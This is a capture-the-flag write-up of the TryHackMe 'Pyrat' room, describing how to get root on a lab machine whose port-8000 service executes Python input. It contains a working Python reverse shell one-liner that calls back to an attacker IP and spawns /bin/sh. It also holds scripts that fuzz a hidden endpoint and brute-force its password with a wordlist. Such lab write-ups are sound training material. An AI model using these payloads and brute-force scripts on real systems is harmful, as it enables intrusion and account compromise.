---
title: "TryHackMe: Pyrat Writeup - Easy"
date: 2025-10-13 19:10:00 +0300
categories: [TryHackMe]
tags: [tryhackme, boot2root, python]
image:
  path: /assets/images/2025-10-13-thm-pyrat/cover.png
---

## Overview

**Pyrat** is a **boot-to-root** style room where getting the reverse shell is very easy, yet escalating your privileges takes some more effort. You will need to have some scripting knowledge in your programming language of choice.

Room Link: [Pyrat](https://tryhackme.com/room/pyrat){:target="_blank" rel="noopener noreferrer"}

## Reconnaissance

After booting up our virtual machine we need to find ways to interact with it. We will start with some basic `nmap` scans.

### Nmap

First lets start by finding open ports on the target machine. To accomplish this lets run `nmap` with the `-p-` argument to scan all the ports. Here is the output I got:

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

Nmap output tells us that only two ports are open, which are 22 and 8000. Next I ran a service scan with the `-sV` argument to see which services are running on these ports:

```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

Lets try and connect to that http server to see what its hosting. When we visit the website on our browser we see a message saying "Try a more basic connection!"

![Try A More Basic Approach]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss1.png)

### Manual connection and reverse shell

So lets try a more basic approach and send a request with `nc`. After we try to make a request with `nc` we see that the server doesn't wait for the `Host:` header and responds immediately, complaining that `GET` is not defined.

![Netcat manual connection]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss2.png)

This could indicate that the server executes your input as python code. Trying to run a `print` command does confirm this theory. So we just need to make a python reverse shell payload and execute it here. I used a reverse shell from [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/){:target="_blank" rel="noopener noreferrer"}

```python
a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("{IP}",{PORT}));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())
```

With our command executed, we have the reverse shell

![Reverse shell]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss3.png)

## Enumeration

Lets start our enumeration by uploading a **linpeas** script. While that runs we can find two users under `/home` by doing some manual enumeration . Both of which we don't have access to. After **linpeas** finishes we can check out the logs. There isn't much interesting other than the unusual `dev` directory under `/opt`. So lets investigate that. At first the directory looked empty, until I ran `ls -la` which revealed a `.git` folder. Trying to run `git log --all` failed, yet we can still access the **config** file. Once we read that we see credentials for the user **think**.

![Think credentials]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss4.png)

## User flag

Trying the credentials on **SSH** is a success and allows us to acquire the user flag in the home directory.

![User flag]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss5.png)

Running `sudo -l` shows that we don't have any sudo privileges. So lets see if we can access the git logs now. Going back to `/opt/dev/.git` and running `git log --all` shows us a commit that added the shell endpoint.

![Git commits]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss6.png)

Lets see what the commit was by running `git show <hash>`.

```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

```

Looking at the python code we can understand that the code first checks if the input matches a certain endpoint, and if it doesn't it drops the privileges and checks again if the input is *shell*. In the case its true it spawns a shell, if its not it executes the python code. Now we can verify this by inputting shell after we connect.

![Verifying shell]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss7.png)

## Root flag

We can see that it worked, so our understanding of the code is correct. We just need to find the endpoint now. So its time to make a script to fuzz the application with different inputs. Here is the script I used:

```python
import socket

wordlist = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
TARGET = ""
PORT = 8000

with open(wordlist, 'r') as f:
    for line in f:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

            s.connect((TARGET, PORT))
            s.send(line.encode('utf-8'))
            resp = s.recv(4096).decode('utf-8')
            if not "is not defined" in resp:
                print(f"Interesting response for {line}\n[RESPONSE] {resp}")
```

After running the script we quickly get a hit, and with that we found our endpoint.

![Found endpoint]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss8.png)

Testing the endpoint on the target we can see that it responded differently, asking for a password this time.

Now lets test some passwords to see how the app behaves. After entering the value `test` we can see that the application allows us to enter a password 3 times before requiring us to enter the endpoint again. 

![How the code behaves]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss11.png)

Lets make another script to brute force this password as well.

```python
import socket

host = ""
port = 8000
endpoint = ""
wordlist = "/usr/share/wordlists/rockyou.txt"

def read_passwords():
    with open(wordlist, 'r', encoding='latin-1') as f:
        passwords = [line.strip() for line in f]
    return passwords

passwords = read_passwords()

for i in range(0, len(passwords), 3):
    with socket.socket() as s:
        s.connect((host, port))
        s.settimeout(2)
        
        s.send((endpoint + "\n").encode())
        response = s.recv(1024)
        
        for j in range(3):
            if i + j >= len(passwords):
                break
                
            pwd = passwords[i + j]
            s.send((pwd + "\n").encode())
            
            try:
                response = s.recv(1024)
                if b"Password:" not in response:
                    print(f"FOUND PASSWORD: {pwd}")
                    print(f"Response: {response.decode()}")
                    exit(0)
            except socket.timeout:
                break
```

After we let it run for a while it finds the password.

![Found password]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss9.png)

After connecting to the machine again and entering both the endpoint and password we get a welcome message.

Typing *shell* gives us a shell as root, and we can grab the flag from here.

![Found root flag]({{ site.baseurl }}/assets/images/2025-10-13-thm-pyrat/ss10.png)

## Conclusion

**Pyrat** is a nice room, it gives you **RCE** early but makes you work for the root and user flags. It also requires some scripting to automate the brute-forcing and fuzzing.
